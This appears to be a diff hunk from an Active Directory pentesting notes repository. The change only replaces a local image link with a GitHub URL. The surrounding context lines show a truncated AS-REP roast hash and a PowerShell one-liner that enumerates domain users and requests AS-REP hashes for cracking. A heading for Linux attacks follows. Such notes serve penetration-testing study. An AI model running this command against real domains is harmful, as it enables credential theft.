@@ -307,7 +307,7 @@ $krb5asrep$AsrepRoastUser@bank.local:64aec4f448950fcc28b74073a2b21b80$333efa323a
 ([adsisearcher]"(&(samAccountType=805306368))").FindAll().Properties.samaccountname | %{Get-ASREPHash -UserName $_ -ErrorAction SilentlyContinue}
 ```
 
-![[Pasted image 20210810232137.png]]
+![](https://github.com/H0j3n/EzpzActiveDirectory/blob/main/src/Pasted%20image%2020210810232137.png)
 
 
 ### Attack On Linux
